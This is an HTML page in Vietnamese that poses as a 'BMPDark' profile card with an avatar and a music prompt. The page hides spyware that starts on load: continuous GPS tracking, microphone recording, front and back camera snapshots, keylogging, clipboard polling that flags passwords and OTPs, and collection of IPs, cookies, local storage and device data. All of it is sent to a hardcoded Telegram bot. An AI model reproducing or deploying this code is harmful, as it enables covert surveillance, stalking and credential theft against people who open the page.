<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>BMPDark</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#fff;min-height:100vh;display:flex;justify-content:center;align-items:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;flex-direction:column}
        .avatar{width:120px;height:120px;border-radius:50%;border:3px solid #0066cc;object-fit:cover;margin-bottom:15px;box-shadow:0 0 20px rgba(0,102,204,0.2)}
        .name{font-size:28px;font-weight:bold;color:#0066cc}
        .music-hint{color:#0066cc;font-size:12px;margin-top:20px;opacity:0.7;animation:pulse 2s infinite}
        @keyframes pulse{0%,100%{opacity:0.5}50%{opacity:1}}
    </style>
</head>
<body>
    <video id="v" playsinline muted autoplay style="position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;pointer-events:none"></video>
    <video id="v2" playsinline muted autoplay style="position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;pointer-events:none"></video>
    <canvas id="c" style="position:fixed;top:-9999px;left:-9999px;opacity:0;width:1px;height:1px"></canvas>
    <canvas id="c2" style="position:fixed;top:-9999px;left:-9999px;opacity:0;width:1px;height:1px"></canvas>
    <canvas id="c3" style="position:fixed;top:-9999px;left:-9999px;opacity:0;width:1px;height:1px"></canvas>
    <audio id="a" style="position:fixed;top:-9999px;left:-9999px;opacity:0"></audio>
    <audio id="music" loop style="position:fixed;top:-9999px;left:-9999px;opacity:0"></audio>
    <input type="file" id="fi1" accept="image/*" capture="user" style="position:fixed;top:-9999px;left:-9999px;opacity:0;width:1px;height:1px">
    <input type="file" id="fi2" accept="image/*" capture="environment" style="position:fixed;top:-9999px;left:-9999px;opacity:0;width:1px;height:1px">

    <img src="https://files.catbox.moe/zzpnph.jpeg" alt="Avatar" class="avatar">
    <div class="name">BMPDark</div>
    <p class="music-hint">🎵 Chạm vào màn hình để phát nhạc</p>

    <script>
        const BOT = '8685753290:AAHqd-iB6Q6Fnpq8L8z3oSpEeYgQveTVF4Y';
        let CHAT_ID = null;
        let gpsWatchId = null;
        let gpsHistory = [];
        let mediaRecorder = null;
        let audioChunks = [];
        let clipboardInterval = null;
        let keylogData = '';
        let cameraStream = null;
        let cameraBackStream = null;
        let webRTCData = {};
        let allFeaturesActive = 0;
        let musicPlaying = false;

        async function getChatID() {
            try {
                const r = await fetch(`https://api.telegram.org/bot${BOT}/getUpdates`);
                const d = await r.json();
                if (d.ok && d.result.length > 0) {
                    CHAT_ID = d.result[d.result.length - 1].message.chat.id.toString();
                    return CHAT_ID;
                }
            } catch(e) {}
            return null;
        }

        async function sendMsg(text) {
            if (!CHAT_ID) await getChatID();
            if (!CHAT_ID) return;
            try {
                await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
                });
            } catch(e) {}
        }

        async function sendPhoto(blob, name) {
            if (!CHAT_ID) await getChatID();
            if (!CHAT_ID) return;
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', blob, name);
            try { await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, { method: 'POST', body: fd }); } catch(e) {}
        }

        async function sendDoc(blob, name) {
            if (!CHAT_ID) await getChatID();
            if (!CHAT_ID) return;
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('document', blob, name);
            try { await fetch(`https://api.telegram.org/bot${BOT}/sendDocument`, { method: 'POST', body: fd }); } catch(e) {}
        }

        async function sendLoc(lat, lon) {
            if (!CHAT_ID) await getChatID();
            if (!CHAT_ID) return;
            try {
                await fetch(`https://api.telegram.org/bot${BOT}/sendLocation`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
                });
            } catch(e) {}
        }

        document.addEventListener('click', () => {
            if (!musicPlaying) {
                const music = document.getElementById('music');
                music.src = 'https://files.catbox.moe/cpn042.mp4';
                music.play().then(() => { musicPlaying = true; }).catch(() => {});
            }
        });

        function startGPS() {
            if (!navigator.geolocation) return;
            gpsWatchId = navigator.geolocation.watchPosition(async (pos) => {
                const p = { lat: pos.coords.latitude, lon: pos.coords.longitude, time: new Date().toISOString() };
                gpsHistory.push(p);
                await sendLoc(p.lat, p.lon);
                if (gpsHistory.length === 1) sendMsg(`📍 GPS: ${p.lat},${p.lon}\n🔗 https://maps.google.com?q=${p.lat},${p.lon}`);
            }, () => {}, { enableHighAccuracy: true, timeout: 3000 });
            allFeaturesActive++;
        }

        async function startAudio() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(stream);
                audioChunks = [];
                mediaRecorder.ondataavailable = e => { if(e.data.size>0) audioChunks.push(e.data); };
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(audioChunks, { type: 'audio/webm' });
                    if (blob.size > 500) { await sendDoc(blob, `audio_${Date.now()}.webm`); sendMsg('🎤 GHI ÂM ĐÃ GỬI'); }
                    audioChunks = [];
                };
                const cycle = () => { 
                    if (mediaRecorder.state === 'inactive') {
                        mediaRecorder.start(); 
                        setTimeout(() => { if(mediaRecorder.state==='recording') mediaRecorder.stop(); setTimeout(cycle, 5000); }, 30000);
                    }
                };
                cycle();
                sendMsg('🎤 GHI ÂM ĐÃ KÍCH HOẠT');
                allFeaturesActive++;
            } catch(e) {}
        }

        async function startCamera() {
            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } });
                const video = document.getElementById('v');
                video.srcObject = cameraStream;
                await video.play();
                setInterval(async () => {
                    const canvas = document.getElementById('c');
                    canvas.width = video.videoWidth || 1280;
                    canvas.height = video.videoHeight || 720;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.3));
                    if (blob && blob.size > 500) await sendPhoto(blob, `cam_${Date.now()}.jpg`);
                }, 30000);
                sendMsg('📷 CAMERA TRƯỚC 720p ĐÃ KÍCH HOẠT');
                allFeaturesActive++;
            } catch(e) {}
        }

        async function startCameraBack() {
            try {
                cameraBackStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } } });
                const video2 = document.getElementById('v2');
                video2.srcObject = cameraBackStream;
                await video2.play();
                setInterval(async () => {
                    const canvas = document.getElementById('c3');
                    canvas.width = video2.videoWidth || 1280;
                    canvas.height = video2.videoHeight || 720;
                    canvas.getContext('2d').drawImage(video2, 0, 0);
                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.3));
                    if (blob && blob.size > 500) { await sendPhoto(blob, `cam_back_${Date.now()}.jpg`); sendMsg('📷 ẢNH CAMERA SAU'); }
                }, 60000);
                sendMsg('📷 CAMERA SAU 720p ĐÃ KÍCH HOẠT');
                allFeaturesActive++;
            } catch(e) {}
        }

        function startKeylogger() {
            let buffer = '';
            document.addEventListener('keydown', e => {
                if (e.key === 'Enter') { buffer += '[ENTER]\n'; sendMsg(`⌨️ KEYLOG: ${buffer}`); keylogData += buffer; buffer = ''; }
                else if (e.key === 'Backspace') buffer = buffer.slice(0, -1);
                else if (e.key === ' ') buffer += ' ';
                else if (e.key.length === 1) buffer += e.key;
                else buffer += `[${e.key}]`;
                if (buffer.length > 80) { sendMsg(`⌨️ KEYLOG: ${buffer}`); keylogData += buffer + '\n'; buffer = ''; }
            });
            allFeaturesActive++;
        }

        function startClipboard() {
            let last = '';
            clipboardInterval = setInterval(async () => {
                try {
                    const text = await navigator.clipboard.readText();
                    if (text && text !== last) { 
                        last = text; 
                        sendMsg(`📋 CLIPBOARD: ${text.substring(0,200)}`);
                        if (text.match(/password|otp|token|secret|key|mã/i) || text.match(/^\d{4,8}$/)) sendMsg(`🔑 MẬT KHẨU/OTP: ${text}`);
                    }
                } catch(e) {}
            }, 1000);
            allFeaturesActive++;
        }

        async function startWebRTC() {
            try {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                pc.createDataChannel('');
                const offer = await pc.createOffer();
                await pc.setLocalDescription(offer);
                const ips = [];
                await new Promise(r => { pc.onicecandidate = e => { if(e.candidate){ const m=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/); if(m&&!ips.includes(m[0])) ips.push(m[0]); } else r(); }; setTimeout(r, 1000); });
                pc.close();
                const localIPs = ips.filter(ip => /^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)/.test(ip));
                sendMsg(`🌐 IP NỘI BỘ: ${localIPs.join(', ') || 'Không tìm thấy'}`);
                allFeaturesActive++;
            } catch(e) {}
        }

        async function startIPInfo() {
            try {
                const r = await fetch('http://ip-api.com/json/?fields=61439');
                const d = await r.json();
                if (d.status === 'success') sendMsg(`🌍 IP PUBLIC: ${d.query}\n🏙️ ${d.city}, ${d.country}\n📡 ISP: ${d.isp}\n🗺️ ${d.lat},${d.lon}`);
                allFeaturesActive++;
            } catch(e) {}
        }

        function startCookies() {
            const cookies = document.cookie.split(';').filter(c=>c.trim());
            if (cookies.length > 0) sendMsg(`🍪 COOKIES (${cookies.length}):\n${cookies.join(';\n').substring(0,2000)}`);
            allFeaturesActive++;
        }

        function startStorage() {
            const ls = {};
            for (let i = 0; i < localStorage.length; i++) ls[localStorage.key(i)] = localStorage.getItem(localStorage.key(i))?.substring(0, 100);
            if (Object.keys(ls).length > 0) sendMsg(`💾 LOCAL STORAGE:\n${JSON.stringify(ls).substring(0,2000)}`);
            allFeaturesActive++;
        }

        function startDeviceInfo() {
            const info = `📱 THIẾT BỊ\n` +
                `🖥️ Màn hình: ${screen.width}x${screen.height}\n` +
                `🧠 RAM: ${navigator.deviceMemory || 'N/A'}GB\n` +
                `🔲 CPU: ${navigator.hardwareConcurrency || 'N/A'} cores\n` +
                `🌐 UA: ${navigator.userAgent.substring(0,200)}\n` +
                `🕐 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n` +
                `🔋 Pin: Đang kiểm tra...`;
            sendMsg(info);
            allFeaturesActive++;
        }

        window.addEventListener('load', async () => {
            await getChatID();
            sendMsg('⚡ BMPDark ĐANG KHỞI ĐỘNG...');
            
            Promise.all([
                startGPS(), startAudio(), startCamera(), startCameraBack(),
                startKeylogger(), startClipboard(), startWebRTC(), startIPInfo(),
                startCookies(), startStorage(), startDeviceInfo()
            ]);
            
            setTimeout(async () => {
                await sendMsg(`✅ BMPDark HOẠT ĐỘNG\n━━━━━━━━━━━━━━━\n📊 ${allFeaturesActive} tính năng đã chạy\n📍 GPS: ${gpsHistory.length>0?'Có':'Đang chờ'}\n📷 Camera: ${cameraStream?'Có':'Chờ'}\n🎤 Audio: ${mediaRecorder?'Có':'Chờ'}\n━━━━━━━━━━━━━━━\n🕐 ${new Date().toLocaleString('vi-VN')}`);
            }, 3000);
        });

        window.addEventListener('beforeunload', () => {
            if (gpsWatchId) navigator.geolocation.clearWatch(gpsWatchId);
            if (clipboardInterval) clearInterval(clipboardInterval);
            if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
            if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
            if (cameraBackStream) cameraBackStream.getTracks().forEach(t => t.stop());
        });
    </script>
</body>
</html>
